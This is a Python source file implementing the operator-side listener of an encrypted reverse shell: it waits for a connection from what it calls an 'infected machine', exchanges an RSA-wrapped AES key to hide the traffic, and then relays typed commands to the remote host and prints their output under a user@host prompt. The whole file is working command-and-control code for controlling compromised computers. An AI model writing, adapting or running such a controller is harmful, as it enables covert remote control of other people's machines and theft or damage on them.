import socket
import threading
import json
import os
import cryptography
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat, PrivateFormat, NoEncryption, load_pem_private_key
from cryptography.hazmat.primitives.hashes import SHA256, Hash
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as p

SERVER_IP = ""
SERVER_PORT = 0
BUFFER_SIZE = 4096

DEBUG_ENCRYPTION = False 
ENCRYPT_DATA = True 
BLOCK_SIZE_BYTES = 16 # for AES
SYM_KEY = b""
pad = p.PKCS7(BLOCK_SIZE_BYTES * 8)

def encrypt(data: bytes) -> bytes:
  iv = os.urandom(16)
  encryptor = Cipher(
    algorithms.AES(SYM_KEY),
    modes.CBC(iv)
  ).encryptor()

  padder = pad.padder()
  data = padder.update(data) + padder.finalize()
  
  return iv + encryptor.update(data) + encryptor.finalize()

def decrypt(data: bytes) -> bytes:
  iv = data[:16]
  data = data[16:]

  decryptor = Cipher(
    algorithms.AES(SYM_KEY),
    modes.CBC(iv)
  ).decryptor()

  data = decryptor.update(data) + decryptor.finalize()

  unpadder = p.PKCS7(128).unpadder()
  data = unpadder.update(data) + unpadder.finalize()
  return data


def key_exchange(conn):
  with open("priv_key.pem", "rb") as f:
    priv_key = load_pem_private_key(
      f.read(),
      password=None,
    )
  # Private key generated with:
  # priv_key = rsa.generate_private_key(
  #   public_exponent=65537,
  #   key_size=2048
  # ).private_bytes(
  #   Encoding.PEM,
  #   PrivateFormat.PKCS8,
  #   NoEncryption()
  # )

  expected_digest = b'\x08r\xfc\x99oq\x14`\x8b\xbf{\xbfv\x0130l(k@\xf1\xa6+P3\x8b\x18\x06\x7f\xc4[\xee'

  pub_key = priv_key.public_key()
  pub_key_bytes = pub_key.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
  digest = Hash(SHA256())
  digest.update(pub_key_bytes)
  digest = digest.finalize()
  if not digest == expected_digest:
    print("Key exchange failed!")
    exit()

  # send public key to client 
  conn.send(pub_key_bytes)
  # get symmetric key from server
  sym_key = conn.recv(BUFFER_SIZE)
  global SYM_KEY
  SYM_KEY = priv_key.decrypt(
    sym_key,
    padding.OAEP(
      mgf=padding.MGF1(algorithm=cryptography.hazmat.primitives.hashes.SHA256()),
      algorithm=SHA256(),
      label=None
    )
  )

def read_conf():
  with open(os.path.join(os.path.dirname(os.path.realpath(__file__)), "cconf"), "r") as f:
    global SERVER_IP
    global SERVER_PORT
    opts = f.read().split("\n")
    for opt in opts:
      if opt.startswith("SERVER_PORT"):
        SERVER_PORT = int(opt.split("=")[1])

def run_command(conn, command):
  payload = json.dumps({
    "command": command
  })

  result = send_to_remote(conn, payload.encode())
  result = result.decode()

  result = json.loads(result)
  return result["stdout"], result["stderr"]

def send_to_remote(conn, message):
  if ENCRYPT_DATA:
    message = encrypt(message)
  conn.send(message)
  result = conn.recv(1024)
  if DEBUG_ENCRYPTION:
    print("received", result)
  if ENCRYPT_DATA:
    result = decrypt(result)
  return result

def get_shell_prefix(conn):
  wdir, err = run_command(conn, "pwd")
  if not err == "":
    return "Shell> "

  user, err = run_command(conn, "whoami")
  if not err == "":
    return "Shell> "

  wdir = wdir.replace("\n", "")
  user = user.replace("\n", "")
  return f"{user}@{conn.getpeername()[0]}:{wdir}$ "
  

def handle_connection(conn):
  if ENCRYPT_DATA:
    key_exchange(conn)

  use_nice_shell_prefix = True
  while True:
    if use_nice_shell_prefix:
      prefix = get_shell_prefix(conn)
    else:
      prefix = "Shell> "

    command = input(prefix)

    stdout, stderr = run_command(conn, command)
    if not stdout == "":
      print(stdout, end="")
    if not stderr == "":
      print(stderr, end="")

if __name__ == "__main__":
  read_conf()
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind(("", SERVER_PORT))
  print("Listening for connections...")
  s.listen(10)
  
  conn, addr = s.accept()
  print(f"Connected to infected machine @ {addr[0]}:{addr[1]}")
  handle_connection(conn)